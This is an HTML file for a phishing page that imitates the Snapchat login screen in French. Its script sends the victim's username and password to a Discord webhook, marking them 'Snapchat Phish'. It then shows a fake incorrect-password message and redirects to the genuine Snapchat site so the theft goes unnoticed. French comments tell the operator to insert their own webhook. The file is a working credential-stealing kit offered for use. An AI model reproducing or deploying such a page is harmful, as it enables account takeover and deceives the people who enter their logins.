<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Connexion</title>
    <style>
        body {
            background: #FFFC00;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            text-align: center;
            width: 300px;
        }
        .login-box h1 {
            color: #000;
            margin-bottom: 20px;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 30px;
            font-size: 16px;
        }
        .login-box button {
            background: #FFFC00;
            border: none;
            padding: 12px 30px;
            border-radius: 30px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .login-box button:hover {
            background: #e6e600;
        }
        .error {
            color: red;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Snapchat</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Nom d'utilisateur ou email" required>
            <input type="password" id="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <p class="error" id="errorMsg" style="display:none;">Mot de passe incorrect. Réessayez.</p>
        <p style="font-size:12px; color:gray;">En vous connectant, vous acceptez nos conditions</p>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Envoie les données vers ton webhook Discord (ou autre)
            var webhookURL = 'https://discord.com/api/webhooks/TA_WEBHOOK_ICI'; // Remplace par ton vrai webhook

            var data = {
                content: '**Snapchat Phish**\nUsername: ' + username + '\nPassword: ' + password
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                // Affiche une erreur pour faire genre "mauvais mot de passe"
                document.getElementById('errorMsg').style.display = 'block';
                // Optionnel : redirige vers la vraie page Snapchat après 2 secondes
                setTimeout(function() {
                    window.location.href = 'https://accounts.snapchat.com';
                }, 2000);
            }).catch(err => {
                console.log('Erreur:', err);
            });
        });
    </script>
</body>
</html>
